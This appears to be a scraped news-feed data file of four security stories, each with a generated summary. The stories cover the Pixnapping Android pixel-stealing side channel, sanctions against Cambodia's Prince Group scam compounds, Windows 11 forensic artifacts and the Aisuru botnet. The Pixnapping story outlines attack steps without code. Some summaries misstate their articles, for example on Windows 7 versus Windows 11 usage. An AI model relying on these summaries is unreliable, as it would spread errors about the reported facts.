case of GPU.zip, a malicious one) to embed the contents of a site from a different domain.\nPixnapping targets the same side channel as GPU.zip, specifically the precise amount of time it takes for a given frame to be rendered on the screen.\n“This allows a malicious app to steal sensitive information displayed by other apps or arbitrary websites, pixel by pixel,” Alan Linghao Wang, lead author of the research paper “\nPixnapping: Bringing Pixel Stealing out of the Stone Age\n,” explained in an interview. “Conceptually, it is as if the malicious app was taking a screenshot of screen contents it should not have access to. Our end-to-end attacks simply measure the rendering time per frame of the graphical operations to determine whether the pixel was white or nonwhite.”\nPixnapping in 3 Steps\nThe attack occurs in three main steps. In the first, the malicious app invokes Android APIs that make calls to the app the attacker wants to snoop on. These calls can also be used to effectively scan an infected device for installed apps of interest. The calls can further cause the targeted app to display specific data it has access to, such as a message thread in a messaging app or a 2FA code for a specific site. This call causes the information to be sent to the Android rendering pipeline, the system that takes each app's pixels so they can be rendered on the screen. The Android-specific calls made include\nactivities\n,\nintents\n, and\ntasks\n.\nIn the second step, Pixnapping performs graphical operations on individual pixels that the targeted app sent to the rendering pipeline. These operations choose the coordinates of target pixels the app wants to steal and begin to check if the color of those coordinates is white or nonwhite or, more generally, if the color is c or non-c (for an arbitrary color c).\n“Suppose, for example, [the attacker] wants to steal a pixel that is part of the screen region where a 2FA character is known to be rendered by Google Authenticator,” Wang said. “This pixel is either white (if nothing was rendered there) or nonwhite (if part of a 2FA digit was rendered there). Then, conceptually, the attacker wants to cause some graphical operations whose rendering time is long if the target victim pixel is nonwhite and short if it is white. The malicious app does this by opening some malicious activities (i.e., windows) in front of the victim app that was opened in Step 1.”\nThe third step measures the amount of time required at each coordinate. By combining the times for each one, the attack can rebuild the images sent to the rendering pipeline one pixel at a time.\nAs Ars reader hotball\nput it\nin the comments below:\nBasically the attacker renders something transparent in front of the target app, then using a timing attack exploiting the GPU's graphical data compression to try finding out the color of the pixels. It's not something as simple as \"give me the pixels of another app showing on the screen right now.\" That's why it takes time and can be too slow to fit within the 30 seconds window of the Google Authenticator app.\nIn an online interview, paper coauthor Ricardo Paccagnella described the attack in more detail:\nStep 1: The malicious app invokes a target app to cause some sensitive visual content to be rendered.\nStep 2: The malicious app uses Android APIs to \"draw over\" that visual content and cause a side channel (in our case, GPU.zip) to leak as a function of the color of individual pixels rendered in Step 1 (e.g., activate only if the pixel color is c).\nStep 3: The malicious app monitors the side effects of Step 2 to infer, e.g., if the color of those pixels was c or not, one pixel at a time.\nSteps 2 and 3 can be implemented differently depending on the side channel that the attacker wants to exploit. In our instantiations on Google and Samsung phones, we exploited the GPU.zip side channel. When using GPU.zip, measuring the rendering time per frame was sufficient to determine if the color of each pixel is c or not. Future instantiations of the attack may use other side channels where controlling memory management and accessing fine-grained timers may be necessary (see Section 3.3 of the paper). Pixnapping would still work then: The attacker would just need to change how Steps 2 and 3 are implemented.\nThe amount of time required to perform the attack depends on several variables, including how many coordinates need to be measured. In some cases, there’s no hard deadline for obtaining the information the attacker wants to steal. In other cases—such as stealing a 2FA code—every second counts, since each one is valid for only 30 seconds. In the paper, the researchers explained:\nTo meet the strict 30-second deadline for the attack, we also reduce the number of samples per target pixel to 16 (compared to the 34 or 64 used in earlier attacks) and decrease the idle time between pixel leaks from 1.5 seconds to 70 milliseconds. To ensure that the attacker has the full 30 seconds to leak the 2FA code, our implementation waits for the beginning of a new 30-second global time interval, determined using the system clock.\n... We use our end-to-end attack to leak 100 different 2FA codes from Google Authenticator on each of our Google Pixel phones. Our attack correctly recovers the full 6-digit 2FA code in 73%, 53%, 29%, and 53% of the trials on the Pixel 6, 7, 8, and 9, respectively. The average time to recover each 2FA code is 14.3, 25.8, 24.9, and 25.3 seconds for the Pixel 6, Pixel 7, Pixel 8, and Pixel 9, respectively. We are unable to leak 2FA codes within 30 seconds using our implementation on the Samsung Galaxy S25 device due to significant noise. We leave further investigation of how to tune our attack to work on this device to future work.\nIn an email, a Google representative wrote, “We issued a patch for CVE-2025-48561 in the September Android security bulletin, which partially mitigates this behavior. We are issuing an additional patch for this vulnerability in the December Android security bulletin. We have not seen any evidence of in-the-wild exploitation.”\nPixnapping is useful research in that it demonstrates the limitations of Google's security and privacy assurances that one installed app can’t access data belonging to another app. The challenges in implementing the attack to steal useful data in real-world scenarios, however, are likely to be significant. In an age when teenagers can steal secrets from Fortune 500 companies simply by\nasking nicely\n, the utility of more complicated and limited attacks is probably of less value.\nThis story originally appeared on\nArs Technica\n.",
      "summary": "The 'Pixnapping' attack represents a significant cybersecurity threat targeting Android devices, specifically Google Pixels and Samsung Galaxy S25 models. This novel method exploits side channels in the Android operating system to covertly steal two-factor authentication codes (2FA) and other private data from apps installed on affected devices. The attack is facilitated by a malicious app that does not require any permissions to operate, making it particularly insidious. It can read sensitive information displayed on the screen of targeted applications, including chat messages, email contents, and 2FA codes stored in authenticator apps. The vulnerability lies in the fact that Android's rendering pipeline allows third-party apps to access data from other apps without explicit user consent or system permissions. Google has released a mitigation update but the researchers claim that their modified version of the attack still works even after the update, demonstrating its evasiveness and adaptability. This attack is reminiscent of the GPU.zip exploit from 2023 which also targeted sensitive visual data displayed on websites via side channels in graphics processing units.",

Now law enforcement has carried out one of its biggest operations yet against that sprawling scam industry, targeting the operators of several\nmodern slavery scam compounds\nin Southeast Asia—where, as a whole, hundreds of thousands of human trafficking victims have been forced to run the fraud operations on behalf of criminal gangs.\nOn Tuesday, officials in the United States and United Kingdom took coordinated action against one giant Cambodian organization and its boss who has allegedly run a series of notorious scam centers in the country. The US Treasury Department’s Office of Foreign Assets Control (OFAC)\nannounced\nit has issued financial sanctions against 146 “targets” linked to the newly designated Prince Group Transnational Criminal Organization. This action includes targeting individuals and shell companies linked to the alleged criminal enterprise. As part of the sweeping action also involving the FBI, the US Department of Justice (DOJ) has also\nseized\nalmost 130,000 bitcoin worth around $15 billion at the time of the announcement—the largest US cryptocurrency seizure to date.\nThis Prince Group organized crime entity, OFAC says, is made up of the Prince Holding Group, a Cambodia-based company, its chairman and CEO Chen Zhi, and his associates and business partners. Publicly, the company\ndescribes\nitself as “one of the largest conglomerates in Cambodia” and says it is involved in real estate development and financial services. However, the DOJ\nalleges\nthat “in secret” Chen and other executives “grew Prince Group into one of Asia’s largest transnational criminal organizations” and ran at least 10 scam compounds across Cambodia.\n“As alleged, the defendant directed one of the largest investment fraud operations in history, fueling an illicit industry that is reaching epidemic proportions,” said Joseph Nocella Jr., a US attorney for the Eastern District of New York,\nin a statement\n. “Prince Group’s investment scams have caused billions of dollars in losses and untold misery to victims around the world.” Chen has not been arrested and remains at large, the DOJ says.\n“The masterminds behind these horrific scam centers are ruining the lives of vulnerable people and buying up London homes to store their money,” Britain’s foreign secretary, Yvette Cooper, said in a\nstatement\n. The UK also placed financial sanctions on Chen, the Prince Group, and other linked entities. The UK’s sanctions also “freeze” businesses and properties allegedly linked to Chen in London, including a £12 million ($16 million) mansion in North London and a £100 million ($133 million) office building in the City of London.\nA WIRED email to an address listed as a media contact on the Prince Holding Group website immediately bounced back.\n“Today’s coordinated action represents the most consequential blow yet to cybercrime networks operating out of Southeast Asia,” says John Wojcik, a senior threat researcher focused on Asia at\nsecurity firm Infoblox\n, who previously tracked scam compounds and Southeast Asian cybercrime at the United Nations Office on Drugs and Crime. Wojcik claims that this doesn't appear to have been “just another criminal syndicate—it was one of the region’s largest cybercriminal and money laundering enterprises, and a clear leader in criminal fintech and infrastructure.”\nIn another, still-unexplained twist, however, crypto-tracing firm\nElliptic pointed out in a blog post\nTuesday that the bitcoins seized by US law enforcement actually appear to be the same funds that were reportedly stolen in 2020 from a Chinese cryptocurrency mining firm called Lubian. Today's indictment describes Lubian as part of Chen Zhi's money laundering operation—perhaps an alleged scheme to funnel dirty scam funds into cryptocurrency mining hardware that would produce new, clean coins with no criminal history.\nWho stole the funds in 2020—or whether a theft even occurred—remains far from clear. “It could be the theft was faked by Chen Zhi as part of a money laundering scheme to confuse the money trail,” says Elliptic cofounder Tom Robinson. “The second possibility is that the theft was genuine. Potentially it could have been the US government. But more likely is that it was someone else.” That thief, Robinson says, might have then been tracked down by US law enforcement, which then somehow took the funds from him or her.\nCrypto mining money-laundering and mysterious thefts aside, Chen is accused in the indictment of being a major player in the Chinese-speaking pig butchering ecosystem. Over the last decade, organized crime gangs operating out of Southeast Asia have operated dozens of scam centers across Myanmar, Laos, and Cambodia. Often run by Chinese organized crime groups, the scam compounds have lured people from more than 60 countries around the world to work in them by using fraudulent job advertisments—often within the tech sector. When people arrive at the compounds, they often have their passports taken away from them and are then forced to run a wide range\nof online scams\n, targeting other people around the world. If they don’t comply, they are sometimes beaten or tortured. As well as human trafficking and fraud, the scam centers are frequently linked to money laundering and\nonline casinos\n.\nThe\nDOJ indictment against Chen\nand seven unnamed co-conspirators alleges that the Prince Group operated more than 100 businesses in 30 countries and names several other alleged subsidiaries. Some “local networks,” including one based in Brooklyn, New York, also worked on behalf of the Prince Group, the indictment says. It claims that since 2015 Chen and company executives built and operated “forced-labor scam compounds” across Cambodia and “used their political influence in multiple countries to protect their criminal enterprise,” including from China’s police officials and Chinese intelligence agency the Ministry of State Security.\n“Chen Zhi was directly involved in managing the scam compounds and maintained records associated with each one, including records tracking profits from the scams that explicitly referenced ‘\nsha zhu\n,’ or pig-butchering,” the indictment claims, alleging there were also “ledgers of bribes to public officials.” One document allegedly held by Chen listed that two scam centers were equipped with 1,250 mobile phones that “controlled” 76,000 social media accounts. The indictment also claims that Chen held images demonstrating “Prince Group’s violent methods” against people who had been trafficked to the scam centers. The document includes images showing people bloodied and beaten.\nThe seizure of 127,271 bitcoins worth more than $15 billion at the time they were confiscated represents by far the biggest monetary seizure in the US Justice Department’s history—not just of cryptocurrency, but of money of any kind. That US law enforcement record was previously set in 2022 with the\nseizure of 95,000 bitcoins worth $3.6 billion\nfrom a Manhattan couple who later pleaded guilty to stealing them from the Bitfinex exchange, and prior to that with a\nbillion-dollar seizure in 2020\nof bitcoins allegedly stolen from the Silk Road dark-web drug market by an unnamed hacker. Meanwhile, police in the UK\nseized 61,000 bitcoins worth $6.7 billion\nin June from a Chinese woman accused of an investment scam, an even bigger sum than those US records but less than half the sum taken from the Prince Group operation.\n“It’s important to note that this seizure is extraordinary not only for its scale but for what it represents,” Ari Redbord, global head of policy at crypto-tracing firm TRM Labs, adding that the seizure is still a “small fraction” of the money generated by scam centers. “These are not isolated scams; they are factory-scale operations powered by forced labor, supercharged by the speed and scale of crypto, and connected through sophisticated money-laundering infrastructure that spans Cambodia, Myanmar, Laos, China, and beyond,” Redbord says.\nRedbord says the widespread action “strikes at the operational and financial core” of the widespread scam center ecosystem. In recent years, researchers tracking the scam compounds in Southeast Asia have seen them rapidly grow and use their illicitly gained money to invest in\nincreasingly high-tech scam operations\n. Over the past two years, scam compounds have also been\nspotted emerging outside of Southeast Asia\n, with sites emerging in the Middle East, Eastern Europe, Latin America, and West Africa.\n“By targeting the financial architecture—the shell companies, banks, exchanges, and real estate that move and hide these proceeds—the US and UK are dismantling the economic engine that sustains these crimes,” Redbord says. “This is what a 21st-century counter-threat finance campaign looks like—coordinated, data-driven, and global.”\nUpdated 2:30 pm ET October 14, 2025 to add more information about the seized bitcoins being traced to an apparent theft from the Lubian mining operation.",

      "published_date": "2025-10-14",
      "content": "IntroductionWindows 11 was released a few years ago, yet it has seen relatively weak enterprise adoption. According to statistics from our Global Emergency Response Team (GERT) investigations, as recently as early 2025, we found that Windows 7, which reached end of support in 2020, was encountered only slightly less often than the newest operating system. Most systems still run Windows 10.Distribution of Windows versions in organizations’ infrastructure. The statistics are based on the Global Emergency Response Team (GERT) data (download)The most widely used operating system was released more than a decade ago, and Microsoft discontinues its support on October 14, 2025. This means we are certainly going to see an increase in the number of Windows 11 systems in organizations where we provide incident response services. This is why we decided to offer a brief overview of changes to forensic artifacts in this operating system. The information should be helpful to our colleagues in the field. The artifacts described here are relevant for Windows 11 24H2, which is the latest OS version at the time of writing this.What is new in Windows 11RecallThe Recall feature was first introduced in May 2024. It allows the computer to remember everything a user has done on the device over the past few months. It works by taking screenshots of the entire display every few seconds. A local AI engine then analyzes these screenshots in the background, extracting all useful information, which is subsequently saved to a database. This database is then used for intelligent searching. Since May 2025, Recall has been broadly available on computers equipped with an NPU, a dedicated chip for AI computations, which is currently compatible only with ARM CPUs.Microsoft Recall is certainly one of the most highly publicized and controversial features announced for Windows 11. Since its initial reveal, ithas been the subject of criticism within the cybersecurity communitybecause of the potential threat it poses to data privacy. Microsoft refined Recall before its release, yetcertain concerns remain. Because of its controversial nature, the option is disabled by default in corporate builds of Windows 11. However, examining the artifacts it creates is worthwhile, just in case an attacker or malicious software activates it. In theory, an organization’s IT department could enable Recall using Group Policies, but we consider that scenario unlikely.As previously mentioned, Recall takes screenshots, which naturally requires temporary storage before analysis. The raw JPEG images can be found at%AppData%\\Local\\CoreAIPlatform.00\\UKP\\{GUID}\\ImageStore\\*. The filenames themselves are the screenshot identifiers (more on those later).Along with the screenshots, their metadata is stored within the standard Exif.Photo.MakerNote (0x927c) tag. This tag holds a significant amount of interesting data, such as the boundaries of the foreground window, the capture timestamp, the window title, the window identifier, and the full path of the process that launched the window. Furthermore, if a browser is in use during the screenshot capture, the URI and domain may be preserved, among other details.Recall is activated on a per-user basis. A key in the user’s registry hive, specificallySoftware\\Policies\\Microsoft\\Windows\\WindowsAI\\, is responsible for enabling and disabling the saving of these screenshots. Microsoft has also introducedseveral new registry keysassociated with Recall management in the latest Windows 11 builds.It is important to note that the version of the feature refined following public controversy includes a specific filter intended to prevent the saving of screenshots and text when potentially sensitive information is on the screen. This includes, for example, an incognito browser window, a payment data input field, or a password manager. However,researchershave indicated that this filter may not always engage reliably.To enable fast searches across all data captured from screenshots, the system uses two DiskANN vector databases (SemanticTextStore.sidbandSemanticImageStore.sidb). However, the standard SQLite database is the most interesting one for investigation:%AppData%\\Local\\CoreAIPlatform.00\\UKP\\{GUID}\\ukg.db, which consists of 20 tables. In the latest release, it is accessible without administrative privileges, yet it is encrypted. At the time of writing this post, there are no publicly known methods to decrypt the database directly. Therefore, we will examine the most relevant tables from the 2024 Windows 11 beta release with Recall.TheApptable holds data about the process that launched the application’s graphical user interface window.TheAppDwellTimetable contains information such as the full path of the process that initiated the application GUI window (WindowsAppId column), the date and time it was launched (HourOfDay, DayOfWeek, HourStartTimestamp), and the duration the window’s display (DwellTime).TheWindowCapturetable records the type of event (Name column):WindowCreatedEventindicates the creation of the first instance of the application window. It can be correlated with the process that created the window.WindowChangedEventtracks changes to the window instance. It allows monitoring movements or size changes of the window instance with the help of the WindowId column, which contains the window’s identifier.WindowCaptureEventsignifies the creation of a screen snapshot that includes the application window. Besides the window identifier, it contains an image identifier (ImageToken). The value of this token can later be used to retrieve the JPEG snapshot file from the aforementioned ImageStore directory, as the filename corresponds to the image identifier.WindowDestroyedEventsignals the closing of the application window.ForegroundChangedEventdoes not contain useful data from a forensics perspective.TheWindowCapturetable also includes a flag indicating whether the application window was in the foreground (IsForeground column), the window boundaries as screen coordinates (WindowBounds), the window title (WindowTitle), a service field for properties (Properties), and the event timestamp (TimeStamp).WindowCaptureTextIndex_contentcontains the text extracted with Optical Character Recognition (OCR) from the snapshot (c2 column), the window title (WindowTitle), the application path (App.Path), the snapshot timestamp (TimeStamp), and the name (Name). This table can be used in conjunction with the WindowCapture (the c0 and Id columns hold identical data, which can be used for joining the tables) and App tables (identical data resides in the AppId and Id columns).Recall artifacts (if the feature was enabled on the system prior to the incident) represent a “goldmine” for the incident responder. They allow for a detailed reconstruction of the attacker’s activity within the compromised system. Conversely, this same functionality can be weaponized: as mentioned previously, the private information filter in Recall does not work flawlessly. Consequently, attackers and malware can exploit it to locate credentials and other sensitive information.Updated standard applicationsStandard applications in Windows 11 have also undergone updates, and for some, this involved changes to both the interface and functionality. Specifically, applications such as Notepad, File Explorer, and the Command Prompt in this version of the OS now support multi-tab mode. Notably, Notepad retains the state of these tabs even after the process terminates. Therefore, Windows 11 now has new artifacts associated with the usage of this application. Our colleague, AbdulRhman Alfaifi, researched these in detail; his work is availablehere.The main directory for Notepad artifacts in Windows 11 is located at%LOCALAPPDATA%\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\.This directory contains two subdirectories:TabStatestores a {GUID}.bin state file for each Notepad tab. This file contains the tab’s contents if the user did not save it to a file. For saved tabs, the file contains the full path to the saved content, the SHA-256 hash of the content, the content itself, the last write time to the file, and other details.WindowsStatestores information about the application window state. This includes the total number of tabs, their order, the currently active tab, and the size and position of the application window on the screen. The state file is named either *.0.bin or *.1.bin.The structure of {GUID}.bin for saved tabs is as follows:FieldTypeValue and explanationsignature[u8;2]NP?u800file_saved_to_pathbool00 = the file was not saved at the specified path01 = the file was savedpath_lengthuLEB128Length of the full path (in characters) to the file where the tab content was writtenfile_pathUTF-16LEThe full path to the file where the tab content was writtenfile_sizeuLEB128The size of the file on disk where the tab content was writtenencodingu8File encoding:0x01 – ANSI0x02 – UTF-16LE0x03 – UTF-16BE0x04 – UTF-8BOM0x05 – UTF-8cr_typeu8Type of carriage return:0x01 — CRLF0x02 — CR0x03 — LFlast_write_timeuLEB128The time of the last write (tab save) to the file, formatted asFILETIMEsha256_hash[u8;32]The SHA-256 hash of the tab content?[u8;2]00 01selection_startuLEB128The offset of the section start from the beginning of the fileselection_enduLEB128The offset of the section end from the beginning of the fileconfig_blockConfigBlockConfigBlock structure configurationcontent_lengthuLEB128The length of the text in the filecontentUTF-16LEThe file content before it was modified by the new data.

If this is the case, the TabState and WindowState artifacts will be unavailable for analysis.If these artifacts are available, however, you can usethe notepad_parser tool, developed by our colleague Abdulrhman Alfaifi, to automate working with them.This particular artifact may assist in recovering the contents of malicious scripts and batch files. Furthermore, it may contain the results and logs from network scanners, credential extraction utilities, and other executables used by threat actors, assuming any unsaved modifications were inadvertently made to them.Changes to familiar artifacts in Windows 11In addition to the new artifacts, Windows 11 introduced several noteworthy changes to existing ones that investigators should be aware of when analyzing incidents.Changes to NTFS attribute behaviorThe behavior of NTFS attributes was changed between Windows 10 and Windows 11 in two $MFT structures: $STANDARD_INFORMATION and $FILE_NAME.The changes to the behavior of the $STANDARD_INFORMATION attributes are presented in the table below:EventAccess fileRename fileCopy file to new folderMove file within one volumeMove file between volumesWin 101903The File Access timestamp is updated. However, it remains unchanged if the system volume is larger than 128 GBThe File Access timestamp remains unchangedThe copy metadata is updatedThe File Access timestamp remains unchangedThe metadata is inherited from the original fileWin 11 24H2The File Access timestamp is updatedThe File Access timestamp is updated to match the modification timeThe copy metadata is inherited from the original fileThe File Access timestamp is updated to match the moving timeThe metadata is updatedBehavior of the $FILENAME attributes was changed as follows:EventRename fileMove file via Explorer within one volumeMove file to Recycle BinWin 101903The timestamps and metadata remain unchangedThe timestamps and metadata remain unchangedThe timestamps and metadata remain unchangedWin 11 24H2The File Access and File Modify timestamps along with the metadata are inherited from the previous version of $STANDARD_INFORMATIONThe File Access and File Modify timestamps along with the metadata are inherited from the previous version of $STANDARD_INFORMATIONThe File Access and File Modify timestamps along with the metadata are inherited from the previous version of $STANDARD_INFORMATIONAnalysts should consider these changes when examining the service files of the NTFS file system.Program Compatibility AssistantProgram Compatibility Assistant (PCA) first appeared way back in 2006 with the release of Windows Vista. Its purpose is to run applications designed for older operating system versions, thus being a relevant artifact for identifying evidence of program execution.Windows 11 introduced new files associated with this feature that are relevant for forensic analysis of application executions. These files are located in the directoryC:\\Windows\\appcompat\\pca\\:PcaAppLaunchDic.txt: each line in this file contains data on the most recent launch of a specific executable file. This information includes the time of the last launch formatted as YYYY-MM-DD HH:MM:SS.f (UTC) and the full path to the file. A pipe character (|) separates the data elements. When the file is run again, the information in the corresponding line is updated. The file uses ANSI (CP-1252) encoding, so executing files with Unicode in their names “breaks” it: new entries (including the entry for running a file with Unicode) stop appearing, only old ones get updated.PcaGeneralDb0.txtandPcaGeneralDb1.txtalternate during data logging: new records are saved to the primary file until its size reaches two megabytes. Once that limit is reached, the secondary file is cleared and becomes the new primary file, and the full primary file is then designated as the secondary. This cycle repeats indefinitely.

They do not log launches of executable files initiated from the console.Windows SearchWindows Search is the built-in indexing and file search mechanism within Windows. Initially, it combed through files directly, resulting in sluggish and inefficient searches. Later, a separate application emerged that created a fast file index. It was not until 2006’s Windows Vista that a search feature was fully integrated into the operating system, with file indexing moved to a background process.From Windows Vista up to and including Windows 10, the file index was stored in an Extensible Storage Engine (ESE) database:%PROGRAMDATA%\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows.edb.Windows 11 breaks this storage down into three SQLite databases:%PROGRAMDATA%\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows-gather.dbcontains general information about indexed files and folders. The most interesting element is the SystemIndex_Gthr table, which stores data such as the name of the indexed file or directory (FileName column), the last modification of the indexed file or directory (LastModified), an identifier used to link to the parent object (ScopeID), and a unique identifier for the file or directory itself (DocumentID). Using the ScopeID and the SystemIndex_GthrPth table, investigators can reconstruct the full path to a file on the system. The SystemIndex_GthrPth table contains the folder name (Name column), the directory identifier (Scope), and the parent directory identifier (Parent). By matching the file’s ScopeID with the directory’s Scope, one can determine the parent directory of the file.%PROGRAMDATA%\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows.dbstores information about the metadata of indexed files. The SystemIndex_1_PropertyStore table is of interest for analysis; it holds the unique identifier of the indexed object (WorkId column), the metadata type (ColumnId), and the metadata itself. Metadata types are described in the SystemIndex_1_PropertyStore_Metadata table (where the content of the Id column corresponds to the ColumnId content from SystemIndex_1_PropertyStore) and are specified in the UniqueKey column.%PROGRAMDATA%\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows-usn.dbdoes not contain useful information for forensic analysis.As depicted in the image below, analyzing theWindows-gather.dbfile using DB Browser for SQLite can provide us evidence of the presence of certain files (e.g., malware files, configuration files, files created and left by attackers, and others).It is worth noting that the LastModified column is stored in the Windows FILETIME format, which holds an unsigned 64-bit date and time value, representing the number of 100-nanosecond units since the start of January 1, 1601. Using a utility such as DCode, we can see this value in UTC, as shown in the image below.Other minor changes in Windows 11It is also worth mentioning a few small but important changes in Windows 11 that do not require a detailed analysis:A complete discontinuation of NTLMv1 means that pass-the-hash attacks are gradually becoming a thing of the past.Removal of the well-known Windows 10 Timeline activity artifact. Although it is no longer being actively maintained, its database remains for now in the files containing user activity information, located at:%userprofile%\\AppData\\Local\\ConnectedDevicesPlatform\\ActivitiesCache.db.Similarly, Windows 11 removed Cortana and Internet Explorer, but the artifacts of these can still be found in the operating system. This may be useful for investigations conducted in machines that were updated from Windows 10 to the newer version.Previous researchalso showed that Event ID 4624, which logs successful logon attempts in Windows, remained largely consistent across versions until a notable update appeared in Windows 11 Pro (22H2). This version introduces a new field, called Remote Credential Guard, marking a subtle but potentially important change in forensic analysis. While its real-world use and forensic significance remain to be observed, its presence suggests Microsoft’s ongoing efforts to enhance authentication-related telemetry.Expanded support for the ReFS file system. The latest Windows 11 update preview made it possible to install the operating system directly onto a ReFS volume, and BitLocker support was also introduced. This file system has several key differences from the familiar NTFS:ReFS does not have the $MFT (Master File Table) that forensics specialists rely on, which contains all current file records on the disk.It does not generate short file names, as NTFS does for DOS compatibility.It does not support hard links or extended object attributes.It offers increased maximum volume and single-file sizes (35 PB compared to 256 TB in NTFS).ConclusionThis post provided a brief overview of key changes to Windows 11 artifacts that are relevant to forensic analysis – most notably, the changes of PCA and modifications to Windows Search mechanism. The ultimate utility of these artifacts in investigations remains to be seen. Nevertheless, we recommend you immediately incorporate the aforementioned files into the scope of your triage collection tool.",
      "summary": "The article discusses the end of support for Windows 10 and the forensic artifacts in Windows 11, highlighting that despite the release of Windows 11 several years ago, its adoption remains low compared to older versions. The Global Emergency Response Team (GERT) statistics indicate that Windows 7, which ended support in 2020, is still more frequently encountered than Windows 11. This situation suggests a continued reliance on Windows 10 by organizations.

      "published_date": "2025-10-10",
      "content": "The world’s largest and most disruptive botnet is now drawing a majority of its firepower from compromised Internet-of-Things (IoT) devices hosted on U.S. Internet providers likeAT&T,ComcastandVerizon, new evidence suggests. Experts say the heavy concentration of infected devices at U.S. providers is complicating efforts to limit collateral damage from the botnet’s attacks, which shattered previous records this week with a brief traffic flood that clocked in at nearly 30 trillion bits of data per second.Since its debut more than a year ago, the Aisuru botnet has steadily outcompeted virtually all other IoT-based botnets in the wild, with recent attacks siphoning Internet bandwidth from an estimated 300,000 compromised hosts worldwide.The hacked systems that get subsumed into the botnet are mostly consumer-grade routers, security cameras, digital video recorders and other devices operating with insecure and outdated firmware, and/or factory-default settings. Aisuru’s owners are continuously scanning the Internet for these vulnerable devices and enslaving them for use in distributed denial-of-service (DDoS) attacks that can overwhelm targeted servers with crippling amounts of junk traffic.As Aisuru’s size has mushroomed, so has its punch. In May 2025, KrebsOnSecurity washit with a near-record 6.35 terabits per second (Tbps) attack from Aisuru,which was then the largest assault that Google’s DDoS protection serviceProject Shieldhad ever mitigated. Days later, Aisuru shattered that record with a data blast in excess of 11 Tbps.By late September, Aisuru was publicly flexing DDoS capabilities topping 22 Tbps. Then on October 6, its operators heaved a whopping 29.6 terabits of junk data packets each second at a targeted host. Hardly anyone noticed because it appears to have been a brief test or demonstration of Aisuru’s capabilities: The traffic flood lasted less only a few seconds and was pointed at an Internet server that was specifically designed to measure large-scale DDoS attacks.A measurement of an Oct. 6 DDoS believed to have been launched through multiple botnets operated by the owners of the Aisuru botnet. Image: DDoS Analyzer Community on Telegram.Aisuru’s overlords aren’t just showing off. Their botnet is being blamed for a series of increasingly massive and disruptive attacks. Although recent assaults from Aisuru have targeted mostly ISPs that serve online gaming communities likeMinecraft, those digital sieges often result in widespread collateral Internet disruption.For the past several weeks, ISPs hosting some of the Internet’s top gaming destinations have been hit with a relentless volley of gargantuan attacks that experts say are well beyond the DDoS mitigation capabilities of most organizations connected to the Internet today.Steven Fergusonis principal security engineer atGlobal Secure Layer(GSL), an ISP in Brisbane, Australia. GSL hostsTCPShield, which offers free or low-cost DDoS protection to more than 50,000 Minecraft servers worldwide. Ferguson told KrebsOnSecurity that on October 8, TCPShield was walloped with a blitz from Aisuru that flooded its network with more than 15 terabits of junk data per second.Ferguson said that after the attack subsided, TCPShield was told by its upstream providerOVHthat they were no longer welcome as a customer.“This was causing serious congestion on their Miami external ports for several weeks, shown publicly via their weather map,” he said, explaining that TCPShield is now solely protected by GSL.Traces from the recent spate of crippling Aisuruattacks on gaming serverscan be still seen at the websiteblockgametracker.gg, which indexes the uptime and downtime of the top Minecraft hosts. In the following example from a series of data deluges on the evening of September 28, we can see an Aisuru botnet campaign briefly knocked TCPShield offline.An Aisuru botnet attack on TCPShield (AS64199) on Sept. 28  can be seen in the giant downward spike in the middle of this uptime graphic. Image: grafana.blockgametracker.gg.Paging through the same uptime graphs for other network operators listed shows almost all of them suffered brief but repeated outages around the same time. Here is the same uptime tracking for Minecraft servers on the network providerCosmic(AS30456), and it shows multiple large dips that correspond to game server outages caused by Aisuru.Multiple DDoS attacks from Aisuru can be seen against the Minecraft host Cosmic on Sept. 28. The sharp downward spikes correspond to brief but enormous attacks from Aisuru. Image: grafana.blockgametracker.gg.BOTNETS R USFerguson said he’s been tracking Aisuru for about three months, and recently he noticed the botnet’s composition shifted heavily toward infected systems at ISPs in the United States. Ferguson shared logs from an attack on October 8 that indexed traffic by the total volume sent through each network provider, and the logs showed that 11 of the top 20 traffic sources were U.S. based ISPs.AT&Tcustomers were by far the biggest U.S. contributors to that attack, followed by botted systems onCharter Communications,Comcast,T-MobileandVerizon, Ferguson found. He said the volume of data packets per second coming from infected IoT hosts on these ISPs is often so high that it has started to affect the quality of service that ISPs are able to provide to adjacent (non-botted) customers.“The impact extends beyond victim networks,” Ferguson said. “For instance we have seen 500 gigabits of traffic via Comcast’s network alone. This amount of egress leaving their network, especially being so US-East concentrated, will result in congestion towards other services or content trying to be reached while an attack is ongoing.”Roland Dobbinsis principal engineer atNetscout. Dobbins said Ferguson is spot on, noting that while most ISPs have effective mitigations in place to handle large incoming DDoS attacks, many are far less prepared to manage the inevitable service degradation caused by large numbers of their customers suddenly using some or all available bandwidth to attack others.“The outbound and cross-bound DDoS attacks can be just as disruptive as the inbound stuff,” Dobbin said.“We’re now in a situation where ISPs are routinely seeing terabit-per-second plus outbound attacks from their networks that can cause operational problems.”“The crying need for effective and universal outbound DDoS attack suppression is something that is really being highlighted by these recent attacks,” Dobbins continued. “A lot of network operators are learning that lesson now, and there’s going to be a period ahead where there’s some scrambling and potential disruption going on.”KrebsOnSecurity sought comment from the ISPs named in Ferguson’s report. Charter Communications pointed toa recent blog post on protecting its network, stating that Charter actively monitors for both inbound and outbound attacks, and that it takes proactive action wherever possible.“In addition to our own extensive network security, we also aim to reduce the risk of customer connected devices contributing to attacks through our Advanced WiFi solution that includes Security Shield, and we make Security Suite available to our Internet customers,” Charter wrote in an emailed response to questions. “With the ever-growing number of devices connecting to networks, we encourage customers to purchase trusted devices with secure development and manufacturing practices, use anti-virus and security tools on their connected devices, and regularly download security patches.”A spokesperson for Comcast responded, “Currently our network is not experiencing impacts and we are able to handle the traffic.”9 YEARS OF MIRAIAisuru is built on the bones of malicious code that wasleaked in 2016bythe original creators of theMiraiIoT botnet. Like Aisuru, Mirai quickly outcompeted all other DDoS botnets in its heyday, and obliterated previous DDoS attack records with a 620 gigabit-per-second siege thatsidelined this website for nearly four days in 2016.The Mirai botmasters likewise used their crime machine to attack mostly Minecraft servers, but with the goal of forcing Minecraft server owners to purchase a DDoS protection service that they controlled. In addition, they rented out slices of the Mirai botnet to paying customers, some of whom used it to mask the sources of other types of cybercrime, such as click fraud.A depiction of the outages caused by the Mirai botnet attacks against the internet infrastructure firm Dyn on October 21, 2016. Source: Downdetector.com.Dobbins said Aisuru’s owners also appear to be renting out their botnet as a distributed proxy network that cybercriminal customers anywhere in the world can use to anonymize their 